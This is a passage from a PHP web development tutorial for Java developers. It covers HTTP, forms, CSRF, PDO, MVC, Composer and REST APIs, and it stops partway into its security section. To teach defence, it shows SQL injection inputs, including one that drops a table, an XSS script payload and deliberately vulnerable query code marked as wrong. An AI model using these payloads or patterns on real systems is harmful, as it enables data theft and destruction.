# Week 4: PHP Web Development — A Java Developer's Guide

> **This week's goal:** Build real web applications with PHP. You will learn HTTP
> handling, forms, database access with PDO, the MVC pattern, Composer, REST APIs,
> and web security. After this week, you have all the PHP skills needed to start
> learning Drupal.

---

## Table of Contents

1. [HTTP Basics in PHP](#1-http-basics-in-php)
2. [Forms — Collecting User Input](#2-forms--collecting-user-input)
3. [Database with PDO](#3-database-with-pdo)
4. [MVC Pattern](#4-mvc-pattern)
5. [Composer — PHP's Package Manager](#5-composer--phps-package-manager)
6. [REST API in PHP](#6-rest-api-in-php)
7. [Security](#7-security)
8. [Putting It All Together — Mini Project](#8-putting-it-all-together--mini-project)
9. [Practice Exercises](#9-practice-exercises)

---

## 1. HTTP Basics in PHP

Every web application runs on HTTP — the protocol that browsers and servers use to
communicate. Understanding how PHP handles HTTP is essential.

### The Request-Response Cycle

**Real-life analogy:** HTTP is like ordering food at a restaurant.

1. **Customer (browser) places an order** — HTTP Request (method, URL, headers, body)
2. **Waiter (web server) takes it to the kitchen** — Apache/Nginx routes to PHP
3. **Kitchen (PHP) prepares the dish** — PHP processes the request
4. **Waiter brings the dish back** — HTTP Response (status code, headers, body)
5. **Customer sees the food** — Browser renders the HTML/JSON

### Reading Request Data

```php
<?php

// REQUEST METHOD — what type of request is this?
$method = $_SERVER['REQUEST_METHOD'];  // "GET", "POST", "PUT", "DELETE"

// GET parameters — from the URL query string
// URL: http://example.com/search.php?query=php&page=2
$query = $_GET['query'] ?? '';  // "php"
$page = (int) ($_GET['page'] ?? 1);  // 2 (cast to int for safety)

// POST data — from form submissions
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// REQUEST — merged GET + POST (use sparingly)
$value = $_REQUEST['key'] ?? '';

// Request headers
$contentType = $_SERVER['CONTENT_TYPE'] ?? '';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$acceptLanguage = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
$authHeader = $_SERVER['HTTP_AUTHORIZATION'] ?? '';

// Request URI and host
$uri = $_SERVER['REQUEST_URI'];    // "/search.php?query=php"
$host = $_SERVER['HTTP_HOST'];      // "example.com"
$isHttps = !empty($_SERVER['HTTPS']);  // true if HTTPS

// Read raw request body (for JSON APIs)
$rawBody = file_get_contents('php://input');
$jsonData = json_decode($rawBody, true);
```

**Java comparison (Servlet):**
```java
String method = request.getMethod();
String query = request.getParameter("query");
String userAgent = request.getHeader("User-Agent");
String body = request.getReader().lines().collect(Collectors.joining());
```

PHP gives you direct access via superglobals. Java requires a request object.

### Sending Response Headers

```php
<?php

// Set HTTP status code
http_response_code(200);  // OK (default)
http_response_code(404);  // Not Found
http_response_code(500);  // Internal Server Error

// Set custom headers
header('Content-Type: application/json');
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('X-Custom-Header: MyValue');

// Redirect to another page
header('Location: /dashboard');
exit;  // IMPORTANT: always exit after redirect!

// Another redirect example
header('Location: https://example.com/login');
http_response_code(302);  // Temporary redirect (default for Location header)
exit;

// Permanent redirect
header('Location: /new-url', true, 301);
exit;
```

**Java comparison:**
```java
response.setStatus(HttpServletResponse.SC_NOT_FOUND);
response.setContentType("application/json");
response.sendRedirect("/dashboard");
```

### Important: Headers Must Come Before Output

```php
<?php

// WRONG — output before headers causes "headers already sent" error
echo "Hello";
header('Location: /dashboard');  // ERROR!

// RIGHT — headers first, then output
header('Content-Type: text/html');
echo "Hello";

// This is why many PHP files omit the closing ?> tag — accidental
// whitespace after ?> counts as output!
```

**Real-life analogy:** Think of an envelope and a letter. You must write the address
(headers) on the envelope BEFORE you seal the letter (body) inside. Once the envelope
is sealed (output started), you cannot add more address lines.

### Common HTTP Status Codes

| Code | Meaning | When to use |
|------|---------|-------------|
| 200 | OK | Successful request |
| 201 | Created | Resource successfully created (POST) |
| 204 | No Content | Success, nothing to return (DELETE) |
| 301 | Moved Permanently | URL has permanently changed |
| 302 | Found (Redirect) | Temporary redirect |
| 400 | Bad Request | Invalid input from client |
| 401 | Unauthorized | Not logged in |
| 403 | Forbidden | Logged in but no permission |
| 404 | Not Found | Resource does not exist |
| 405 | Method Not Allowed | Wrong HTTP method |
| 500 | Internal Server Error | Something broke on the server |

---

## 2. Forms — Collecting User Input

### Basic HTML Form with PHP Processing

```php
<!-- register.php -->
<?php
$errors = [];
$name = '';
$email = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Collect and sanitize input
    $name = trim($_POST['name'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';

    // Validate
    if (empty($name)) {
        $errors[] = "Name is required";
    }
    if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors[] = "Valid email is required";
    }
    if (strlen($password) < 8) {
        $errors[] = "Password must be at least 8 characters";
    }

    // If no errors, process the form
    if (empty($errors)) {
        // Save to database, send email, etc.
        header('Location: /welcome.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head><title>Register</title></head>
<body>
    <h1>Register</h1>

    <?php if (!empty($errors)): ?>
        <div style="color: red;">
            <ul>
                <?php foreach ($errors as $error): ?>
                    <li><?php echo htmlspecialchars($error); ?></li>
                <?php endforeach; ?>
            </ul>
        </div>
    <?php endif; ?>

    <form method="POST" action="">
        <div>
            <label>Name:</label>
            <input type="text" name="name"
                   value="<?php echo htmlspecialchars($name); ?>">
        </div>
        <div>
            <label>Email:</label>
            <input type="email" name="email"
                   value="<?php echo htmlspecialchars($email); ?>">
        </div>
        <div>
            <label>Password:</label>
            <input type="password" name="password">
        </div>
        <button type="submit">Register</button>
    </form>
</body>
</html>
```

**Key points:**
- `method="POST"` — form data goes in the request body (not the URL)
- `action=""` — submits to the same page (the PHP at the top handles it)
- `htmlspecialchars()` — prevents XSS attacks (we will cover this in Security)
- Values are preserved in the form after validation errors (good UX)

**Java comparison (Spring MVC):**
```java
@PostMapping("/register")
public String register(@ModelAttribute UserForm form, BindingResult result) {
    if (result.hasErrors()) return "register";
    userService.save(form);
    return "redirect:/welcome";
}
```

PHP handles form processing inline in the same file. Java/Spring separates the
controller from the view. Drupal has its own Form API that is similar to Spring's
approach but built on PHP arrays.

### Filter Functions — Built-in Validation

PHP has built-in filter functions that save you from writing validation regex:

```php
<?php

// Validate email
$email = "sheetal@example.com";
if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo "Valid email!";
}

// Validate URL
$url = "https://example.com";
if (filter_var($url, FILTER_VALIDATE_URL)) {
    echo "Valid URL!";
}

// Validate integer
$age = "25";
$validAge = filter_var($age, FILTER_VALIDATE_INT);
if ($validAge !== false) {
    echo "Valid integer: $validAge";
}

// Validate integer within range
$page = "5";
$validPage = filter_var($page, FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 1, 'max_range' => 100]
]);

// Sanitize — remove dangerous characters
$dirty = "<script>alert('hacked')</script>";
$clean = filter_var($dirty, FILTER_SANITIZE_SPECIAL_CHARS);
echo $clean;  // &lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;

// Sanitize email — remove characters that are not allowed in emails
$email = "she(eta)l@exa mple.com";
$clean = filter_var($email, FILTER_SANITIZE_EMAIL);
echo $clean;  // "sheetal@example.com"
```

### CSRF Protection

CSRF (Cross-Site Request Forgery) is an attack where a malicious site tricks a user's
browser into submitting a form to your site. Prevent it with tokens:

```php
<?php
session_start();

// Generate CSRF token (do this when displaying the form)
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// In the form — include the token as a hidden field
?>
<form method="POST">
    <input type="hidden" name="csrf_token"
           value="<?php echo $_SESSION['csrf_token']; ?>">
    <!-- other form fields -->
    <button type="submit">Submit</button>
</form>

<?php
// When processing the form — verify the token
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) ||
        $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        http_response_code(403);
        die('Invalid CSRF token — possible attack!');
    }

    // Token is valid, process the form
    // Regenerate token for next request (prevents token reuse)
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

**Real-life analogy:** CSRF tokens are like OTPs (One-Time Passwords) from your bank.
When you want to transfer money, the bank sends an OTP to your phone. Only someone
with your phone can complete the transaction. Similarly, only forms from YOUR website
have the correct CSRF token.

**Java comparison:** Spring Boot handles CSRF automatically with Spring Security. In
raw PHP, you implement it manually. Drupal handles CSRF protection through its Form
API — one more reason to use Drupal's forms instead of raw HTML forms.

### File Upload Forms

```php
<?php
// Form MUST have enctype="multipart/form-data" for file uploads
?>
<form method="POST" enctype="multipart/form-data">
    <label>Profile Photo:</label>
    <input type="file" name="photo" accept="image/*">
    <button type="submit">Upload</button>
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    $file = $_FILES['photo'];

    // Validate file type
    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);

    if (!in_array($mimeType, $allowedTypes)) {
        die("Invalid file type. Only JPG, PNG, and GIF allowed.");
    }

    // Validate file size (max 2 MB)
    $maxSize = 2 * 1024 * 1024;  // 2 MB in bytes
    if ($file['size'] > $maxSize) {
        die("File too large. Maximum 2 MB.");
    }

    // Generate safe filename (never trust the original filename!)
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    $safeFilename = uniqid('photo_', true) . '.' . $extension;

    // Move to uploads directory
    $destination = 'uploads/' . $safeFilename;
    if (move_uploaded_file($file['tmp_name'], $destination)) {
        echo "Uploaded successfully: $safeFilename";
    } else {
        echo "Upload failed.";
    }
}
```

### Common Mistakes

1. **Not validating server-side:**
   ```php
   // BAD — relying on HTML5 validation only
   // <input type="email" required> can be bypassed easily!

   // GOOD — always validate on the server too
   if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
       $errors[] = "Invalid email";
   }
   ```

2. **Forgetting htmlspecialchars() in output:**
   ```php
   // BAD — XSS vulnerability!
   echo "Hello, " . $_POST['name'];
   // If name is "<script>alert('hacked')</script>" — the script RUNS!

   // GOOD
   echo "Hello, " . htmlspecialchars($_POST['name']);
   // Now the script is displayed as text, not executed
   ```

---

## 3. Database with PDO

PDO (PHP Data Objects) is PHP's database abstraction layer. It works with MySQL,
PostgreSQL, SQLite, and many other databases.

### Connecting to MySQL

```php
<?php

$host = 'localhost';
$dbname = 'myapp';
$username = 'root';
$password = '';

try {
    $pdo = new PDO(
        "mysql:host=$host;dbname=$dbname;charset=utf8mb4",
        $username,
        $password,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,  // Throw exceptions on errors
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,  // Return associative arrays
            PDO::ATTR_EMULATE_PREPARES => false,  // Use real prepared statements
        ]
    );
    echo "Connected successfully!";
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}
```

**Java comparison (JDBC):**
```java
Connection conn = DriverManager.getConnection(
    "jdbc:mysql://localhost:3306/myapp", "root", ""
);
```

| Concept | Java JDBC | PHP PDO |
|---------|-----------|---------|
| Driver | `DriverManager.getConnection()` | `new PDO()` |
| DSN format | `jdbc:mysql://host:port/db` | `mysql:host=...;dbname=...` |
| Error handling | `SQLException` | `PDOException` |
| Prepared statements | `PreparedStatement` | `PDO::prepare()` |
| Fetch results | `ResultSet` | `fetch()` / `fetchAll()` |

### CRUD Operations

#### Create (INSERT)

```php
<?php

// ALWAYS use prepared statements — NEVER concatenate user input into SQL!

// Named parameters (most readable)
$stmt = $pdo->prepare(
    "INSERT INTO users (name, email, city, age) VALUES (:name, :email, :city, :age)"
);
$stmt->execute([
    ':name' => 'Sheetal',
    ':email' => 'sheetal@example.com',
    ':city' => 'Mumbai',
    ':age' => 25,
]);

$newUserId = $pdo->lastInsertId();
echo "Created user with ID: $newUserId";

// Positional parameters (shorter)
$stmt = $pdo->prepare(
    "INSERT INTO users (name, email, city, age) VALUES (?, ?, ?, ?)"
);
$stmt->execute(['Sheetal', 'sheetal@example.com', 'Mumbai', 25]);
```

**Java comparison:**
```java
PreparedStatement stmt = conn.prepareStatement(
    "INSERT INTO users (name, email, city, age) VALUES (?, ?, ?, ?)"
);
stmt.setString(1, "Sheetal");
stmt.setString(2, "sheetal@example.com");
stmt.setString(3, "Mumbai");
stmt.setInt(4, 25);
stmt.executeUpdate();
```

PHP is more concise — you pass all parameters as an array in one call. Java requires
individual `setString()`, `setInt()` calls.

#### Read (SELECT)

```php
<?php

// Fetch one row
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([42]);
$user = $stmt->fetch();  // Returns associative array or false

if ($user) {
    echo $user['name'];   // "Sheetal"
    echo $user['email'];  // "sheetal@example.com"
} else {
    echo "User not found";
}

// Fetch all rows
$stmt = $pdo->prepare("SELECT * FROM users WHERE city = ?");
$stmt->execute(['Mumbai']);
$users = $stmt->fetchAll();  // Returns array of arrays

foreach ($users as $user) {
    echo "{$user['name']} — {$user['email']}\n";
}

// Fetch with LIKE search
$search = "shee";
$stmt = $pdo->prepare("SELECT * FROM users WHERE name LIKE ?");
$stmt->execute(["%$search%"]);
$results = $stmt->fetchAll();

// Count results
$stmt = $pdo->prepare("SELECT COUNT(*) as total FROM users WHERE city = ?");
$stmt->execute(['Mumbai']);
$count = $stmt->fetch()['total'];
echo "Total Mumbai users: $count";
```

**Java comparison:**
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, 42);
ResultSet rs = stmt.executeQuery();
if (rs.next()) {
    System.out.println(rs.getString("name"));
}
```

PHP's `fetch()` returns an associative array directly. Java's `ResultSet` requires
`getString()`, `getInt()` calls for each column.

#### Update

```php
<?php

$stmt = $pdo->prepare("UPDATE users SET name = ?, email = ? WHERE id = ?");
$stmt->execute(['Sheetal Sharma', 'sheetal.sharma@example.com', 42]);

$rowsAffected = $stmt->rowCount();
echo "Updated $rowsAffected row(s)";
```

#### Delete

```php
<?php

$stmt = $pdo->prepare("DELETE FROM users WHERE id = ?");
$stmt->execute([42]);

$rowsAffected = $stmt->rowCount();
echo "Deleted $rowsAffected row(s)";
```

### Transactions

```php
<?php

// Transfer money between accounts — must be atomic!
try {
    $pdo->beginTransaction();

    // Deduct from sender
    $stmt = $pdo->prepare("UPDATE accounts SET balance = balance - ? WHERE id = ?");
    $stmt->execute([5000, 1]);

    // Check sender had enough balance
    $stmt = $pdo->prepare("SELECT balance FROM accounts WHERE id = ?");
    $stmt->execute([1]);
    $balance = $stmt->fetch()['balance'];

    if ($balance < 0) {
        throw new RuntimeException("Insufficient balance!");
    }

    // Add to receiver
    $stmt = $pdo->prepare("UPDATE accounts SET balance = balance + ? WHERE id = ?");
    $stmt->execute([5000, 2]);

    $pdo->commit();
    echo "Transfer successful!";

} catch (Exception $e) {
    $pdo->rollBack();
    echo "Transfer failed: " . $e->getMessage();
}
```

**Java comparison:**
```java
try {
    conn.setAutoCommit(false);
    // ... execute statements ...
    conn.commit();
} catch (SQLException e) {
    conn.rollback();
}
```

Same concept — `beginTransaction()`, `commit()`, `rollBack()`. PHP and Java
transaction handling is virtually identical.

**Real-life analogy:** A transaction is like a bank transfer. If money is deducted
from your account but the server crashes before it reaches the other account, the
transaction rolls back — your money returns to your account. Either both things
happen, or neither happens.

### PDO vs Drupal's Database API

Drupal wraps PDO in its own Database API that adds:
- Query builders (no raw SQL needed)
- Schema management
- Database abstraction (works with MySQL, PostgreSQL, SQLite)

```php
<?php
// Raw PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE city = ?");
$stmt->execute(['Mumbai']);
$users = $stmt->fetchAll();

// Drupal's Database API (same result, different syntax)
$users = \Drupal::database()
    ->select('users', 'u')
    ->fields('u')
    ->condition('city', 'Mumbai')
    ->execute()
    ->fetchAll();
```

Understanding PDO helps you understand what Drupal's Database API does underneath.

### Common Mistakes

1. **SQL Injection — THE Cardinal Sin:**
   ```php
   // NEVER EVER DO THIS — SQL Injection vulnerability!
   $name = $_GET['name'];
   $stmt = $pdo->query("SELECT * FROM users WHERE name = '$name'");
   // If name is: ' OR '1'='1 — it returns ALL users!
   // If name is: '; DROP TABLE users;-- — it DELETES your table!

   // ALWAYS use prepared statements
   $stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
   $stmt->execute([$_GET['name']]);
   // Now the input is treated as data, not SQL code
   ```

2. **Not using ERRMODE_EXCEPTION:**
   ```php
   // BAD — silent failures
   $pdo = new PDO($dsn, $user, $pass);
   // If a query fails, it silently returns false — you might never notice!

   // GOOD — exceptions on errors
   $pdo = new PDO($dsn, $user, $pass, [
       PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
   ]);
   ```

---

## 4. MVC Pattern

MVC (Model-View-Controller) is the architecture pattern used by most web frameworks,
including Drupal. If you know Spring MVC, the concepts are identical.

### What Is MVC?

**Real-life analogy:** Think of an Indian restaurant:
- **Model (Kitchen)** — prepares the food (data). The kitchen knows recipes and
  ingredients. It does not care how the food is served.
- **View (Plate & Table Setting)** — presents the food (display). The plate makes
  the food look appealing. It does not cook anything.
- **Controller (Waiter)** — takes the order, tells the kitchen what to make, and
  brings the result to the table. Coordinates between kitchen and customer.

```
Customer (Browser)
    ↓ (HTTP Request)
Controller (waiter — decides what to do)
    ↓
Model (kitchen — fetches/saves data)
    ↓
Controller (receives data from model)
    ↓
View (plate — formats the data as HTML)
    ↓
Customer (Browser receives HTML)
```

### Building a Mini MVC Framework

Let us build a tiny MVC application to understand the pattern:

**Directory Structure:**
```
my-app/
├── public/
│   └── index.php        ← Entry point (front controller)
├── src/
│   ├── Controllers/
│   │   └── UserController.php
│   ├── Models/
│   │   └── User.php
│   └── Views/
│       ├── layout.php
│       └── users/
│           ├── list.php
│           └── show.php
└── config/
    └── database.php
```

**Entry Point — public/index.php (Front Controller):**

```php
<?php
// All requests come here first (via .htaccess rewrite)
require_once __DIR__ . '/../config/database.php';

// Simple routing
$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$method = $_SERVER['REQUEST_METHOD'];

// Route to the appropriate controller method
if ($uri === '/users' && $method === 'GET') {
    $controller = new UserController($pdo);
    $controller->index();
} elseif (preg_match('/^\/users\/(\d+)$/', $uri, $matches) && $method === 'GET') {
    $controller = new UserController($pdo);
    $controller->show((int) $matches[1]);
} else {
    http_response_code(404);
    echo "Page not found";
}
```

**Model — src/Models/User.php:**

```php
<?php

class User {
    private PDO $pdo;

    public function __construct(PDO $pdo) {
        $this->pdo = $pdo;
    }

    public function findAll(): array {
        $stmt = $this->pdo->query("SELECT * FROM users ORDER BY name");
        return $stmt->fetchAll();
    }

    public function findById(int $id): ?array {
        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE id = ?");
        $stmt->execute([$id]);
        $user = $stmt->fetch();
        return $user ?: null;
    }

    public function create(array $data): int {
        $stmt = $this->pdo->prepare(
            "INSERT INTO users (name, email, city) VALUES (?, ?, ?)"
        );
        $stmt->execute([$data['name'], $data['email'], $data['city']]);
        return (int) $this->pdo->lastInsertId();
    }
}
```

**Controller — src/Controllers/UserController.php:**

```php
<?php

class UserController {
    private User $userModel;

    public function __construct(PDO $pdo) {
        $this->userModel = new User($pdo);
    }

    // GET /users — list all users
    public function index(): void {
        $users = $this->userModel->findAll();
        $title = "All Users";
        include __DIR__ . '/../Views/users/list.php';
    }

    // GET /users/{id} — show one user
    public function show(int $id): void {
        $user = $this->userModel->findById($id);
        if ($user === null) {
            http_response_code(404);
            echo "User not found";
            return;
        }
        $title = $user['name'];
        include __DIR__ . '/../Views/users/show.php';
    }
}
```

**View — src/Views/users/list.php:**

```php
<!DOCTYPE html>
<html>
<head><title><?php echo htmlspecialchars($title); ?></title></head>
<body>
    <h1><?php echo htmlspecialchars($title); ?></h1>

    <table border="1">
        <tr>
            <th>Name</th>
            <th>Email</th>
            <th>City</th>
            <th>Action</th>
        </tr>
        <?php foreach ($users as $user): ?>
        <tr>
            <td><?php echo htmlspecialchars($user['name']); ?></td>
            <td><?php echo htmlspecialchars($user['email']); ?></td>
            <td><?php echo htmlspecialchars($user['city']); ?></td>
            <td><a href="/users/<?php echo $user['id']; ?>">View</a></td>
        </tr>
        <?php endforeach; ?>
    </table>
</body>
</html>
```

### Java Comparison — Spring MVC

| Concept | Spring MVC | PHP MVC |
|---------|-----------|---------|
| Entry point | `DispatcherServlet` (auto) | `index.php` (front controller) |
| Controller | `@Controller` class | Plain PHP class |
| Route mapping | `@GetMapping("/users")` | Manual routing in index.php |
| Model | `@Repository` + JPA entities | Plain PHP class + PDO |
| View | Thymeleaf templates (.html) | PHP templates (.php) |
| DI | `@Autowired` | Manual constructor injection |
| Template vars | `model.addAttribute("users", users)` | `$users` variable in scope |

### How Drupal Uses MVC

Drupal follows MVC loosely. It uses:
- **Controllers** — classes extending `ControllerBase`
- **Entities** — instead of plain models (nodes, users, taxonomy terms)
- **Twig templates** — instead of raw PHP templates
- **Routing** — via YAML files instead of PHP routing

```php
<?php
// Drupal Controller example
namespace Drupal\my_module\Controller;

use Drupal\Core\Controller\ControllerBase;

class UserPageController extends ControllerBase {

    public function listUsers() {
        // Model layer — query entities
        $users = $this->entityTypeManager()
            ->getStorage('user')
            ->loadMultiple();

        // Return a render array (Drupal's "view" system)
        return [
            '#theme' => 'user_list',
            '#users' => $users,
        ];
    }
}
```

The routing is defined in YAML:
```yaml
# my_module.routing.yml
my_module.user_list:
  path: '/admin/users'
  defaults:
    _controller: '\Drupal\my_module\Controller\UserPageController::listUsers'
    _title: 'User List'
  requirements:
    _permission: 'access content'
```

Understanding raw MVC in PHP makes Drupal's architecture much clearer.

---

## 5. Composer — PHP's Package Manager

Composer is to PHP what Maven is to Java and npm is to JavaScript. Drupal 8+ is
entirely managed through Composer.

### Installing Composer

```bash
# On Mac
brew install composer

# On Linux
curl -sS https://getcomposer.org/installer | php
sudo mv composer.phar /usr/local/bin/composer

# Verify
composer --version
```

### composer.json — Like pom.xml

```json
{
    "name": "sheetal/my-app",
    "description": "My PHP application",
    "type": "project",
    "require": {
        "php": ">=7.4",
        "guzzlehttp/guzzle": "^7.0",
        "monolog/monolog": "^2.0"
    },
    "require-dev": {
        "phpunit/phpunit": "^9.0"
    },
    "autoload": {
        "psr-4": {
            "App\\": "src/"
        }
    }
}
```

**Java comparison — pom.xml:**
```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
        <version>2.7.0</version>
    </dependency>
</dependencies>
```

| Composer | Maven | npm |
|----------|-------|-----|
| `composer.json` | `pom.xml` | `package.json` |
| `composer.lock` | (no exact equivalent) | `package-lock.json` |
| `vendor/` | `.m2/repository/` | `node_modules/` |
| `composer install` | `mvn install` | `npm install` |
| `composer require pkg` | Add to pom.xml + mvn install | `npm install pkg` |
| `composer update` | `mvn versions:use-latest` | `npm update` |
| Packagist.org | Maven Central | npmjs.com |

### Common Composer Commands

```bash
# Install all dependencies listed in composer.json
composer install

# Add a new package
composer require guzzlehttp/guzzle

# Add a development-only package
composer require --dev phpunit/phpunit

# Update all packages to latest allowed versions
composer update

# Update one specific package
composer update guzzlehttp/guzzle

# Remove a package
composer remove guzzlehttp/guzzle

# Regenerate autoload files (after adding new classes)
composer dump-autoload

# Show installed packages
composer show

# Check for security vulnerabilities
composer audit
```

### Using Installed Packages

After `composer install`, include the autoloader and use any package:

```php
<?php
require_once 'vendor/autoload.php';  // One line — loads EVERYTHING

use GuzzleHttp\Client;
use Monolog\Logger;
use Monolog\Handler\StreamHandler;

// Use Guzzle (HTTP client library)
$client = new Client();
$response = $client->get('https://api.example.com/users');
$users = json_decode($response->getBody(), true);

// Use Monolog (logging library)
$log = new Logger('my-app');
$log->pushHandler(new StreamHandler('app.log', Logger::INFO));
$log->info('Application started');
$log->error('Something went wrong', ['error' => 'details here']);
```

### Composer and Drupal

Drupal 8+ uses Composer for everything:

```bash
# Create a new Drupal project
composer create-project drupal/recommended-project my-drupal-site

# Install a Drupal module
composer require drupal/admin_toolbar

# Install a Drupal theme
composer require drupal/bootstrap

# Update Drupal core
composer update drupal/core --with-dependencies

# Update a specific module
composer update drupal/admin_toolbar
```

Your Drupal project's `composer.json` manages:
- Drupal core itself
- Contributed modules (from drupal.org)
- PHP libraries used by custom modules
- Development tools (Drush, PHPUnit)

**Real-life analogy:** Composer is like BigBasket or Swiggy Instamart for your PHP
project. Instead of going to different shops for each ingredient, you list what you
need in `composer.json` (your shopping list), run `composer install`, and everything
is delivered to the `vendor/` folder (your kitchen). When a module needs another
module, Composer handles the dependency chain automatically — just like how ordering
biryani automatically includes rice, spices, and raita.

---

## 6. REST API in PHP

Building REST APIs is important for modern web development. Drupal has built-in REST
support, but understanding how to build one from scratch in PHP helps you customize
Drupal's API behavior.

### Simple REST API

```php
<?php
// api.php — simple REST API endpoint

header('Content-Type: application/json');

$method = $_SERVER['REQUEST_METHOD'];
$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// Simple routing
$routes = [];
if (preg_match('/^\/api\/users$/', $uri)) {
    $resource = 'users';
    $id = null;
} elseif (preg_match('/^\/api\/users\/(\d+)$/', $uri, $matches)) {
    $resource = 'users';
    $id = (int) $matches[1];
} else {
    http_response_code(404);
    echo json_encode(['error' => 'Endpoint not found']);
    exit;
}

// Handle each HTTP method
switch ($method) {
    case 'GET':
        if ($id) {
            // GET /api/users/42 — get one user
            $user = getUserById($pdo, $id);
            if ($user) {
                echo json_encode($user);
            } else {
                http_response_code(404);
                echo json_encode(['error' => 'User not found']);
            }
        } else {
            // GET /api/users — list all users
            $users = getAllUsers($pdo);
            echo json_encode($users);
        }
        break;

    case 'POST':
        // POST /api/users — create a new user
        $data = json_decode(file_get_contents('php://input'), true);

        // Validate
        if (empty($data['name']) || empty($data['email'])) {
            http_response_code(400);
            echo json_encode(['error' => 'Name and email are required']);
            break;
        }

        $newId = createUser($pdo, $data);
        http_response_code(201);
        echo json_encode(['id' => $newId, 'message' => 'User created']);
        break;

    case 'PUT':
        // PUT /api/users/42 — update a user
        if (!$id) {
            http_response_code(400);
            echo json_encode(['error' => 'User ID required']);
            break;
        }

        $data = json_decode(file_get_contents('php://input'), true);
        updateUser($pdo, $id, $data);
        echo json_encode(['message' => 'User updated']);
        break;

    case 'DELETE':
        // DELETE /api/users/42 — delete a user
        if (!$id) {
            http_response_code(400);
            echo json_encode(['error' => 'User ID required']);
            break;
        }

        deleteUser($pdo, $id);
        http_response_code(204);  // No Content
        break;

    default:
        http_response_code(405);
        echo json_encode(['error' => 'Method not allowed']);
}
```

**Java comparison (Spring Boot):**
```java
@RestController
@RequestMapping("/api/users")
public class UserController {

    @GetMapping
    public List<User> listUsers() { }

    @GetMapping("/{id}")
    public User getUser(@PathVariable int id) { }

    @PostMapping
    @ResponseStatus(HttpStatus.CREATED)
    public User createUser(@RequestBody UserDTO data) { }

    @PutMapping("/{id}")
    public User updateUser(@PathVariable int id, @RequestBody UserDTO data) { }

    @DeleteMapping("/{id}")
    @ResponseStatus(HttpStatus.NO_CONTENT)
    public void deleteUser(@PathVariable int id) { }
}
```

Spring Boot provides annotations that make routing automatic and clean. In raw PHP,
you handle routing manually. Drupal's REST module provides similar convenience to
Spring's annotations:

```yaml
# Drupal REST resource routing
rest:
  resource:
    entity:node:
      GET:
        supported_formats: [json]
        supported_auth: [cookie, basic_auth]
      POST:
        supported_formats: [json]
        supported_auth: [cookie, basic_auth]
```

### Reading JSON Request Body

```php
<?php

// For POST/PUT/PATCH requests with JSON body
$rawBody = file_get_contents('php://input');
$data = json_decode($rawBody, true);

if ($data === null && json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON in request body']);
    exit;
}

// Now $data is a regular PHP array
echo $data['name'];
echo $data['email'];
```

`php://input` is a special PHP stream that contains the raw request body. It is the
equivalent of reading from `request.getInputStream()` in Java Servlets.

### Sending JSON Responses

```php
<?php

// Helper function for consistent JSON responses
function jsonResponse(array $data, int $statusCode = 200): void {
    http_response_code($statusCode);
    header('Content-Type: application/json');
    echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Usage
jsonResponse(['users' => $users], 200);
jsonResponse(['error' => 'Not found'], 404);
jsonResponse(['id' => $newId, 'message' => 'Created'], 201);
```

### Testing Your API

```bash
# GET — list all users
curl http://localhost:8000/api/users

# GET — one user
curl http://localhost:8000/api/users/42

# POST — create user
curl -X POST http://localhost:8000/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "Sheetal", "email": "sheetal@example.com", "city": "Mumbai"}'

# PUT — update user
curl -X PUT http://localhost:8000/api/users/42 \
  -H "Content-Type: application/json" \
  -d '{"name": "Sheetal Sharma", "city": "Pune"}'

# DELETE — delete user
curl -X DELETE http://localhost:8000/api/users/42
```

---

## 7. Security

Web security is critical. PHP has been historically associated with security issues,
but modern PHP with good practices is secure. Drupal handles most security concerns
through its API, but you must understand the underlying vulnerabilities.

### SQL Injection

The most dangerous web vulnerability. An attacker injects SQL code through user input.

```php
<?php

// VULNERABLE — NEVER do this!
$name = $_GET['name'];  // User provides: ' OR '1'='1
$sql = "SELECT * FROM users WHERE name = '$name'";
// Becomes: SELECT * FROM users WHERE name = '' OR '1'='1'
// Returns ALL users!

// Even worse: user provides: '; DROP TABLE users; --
// Becomes: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
// DELETES your entire table!

// SAFE — always use prepared statements
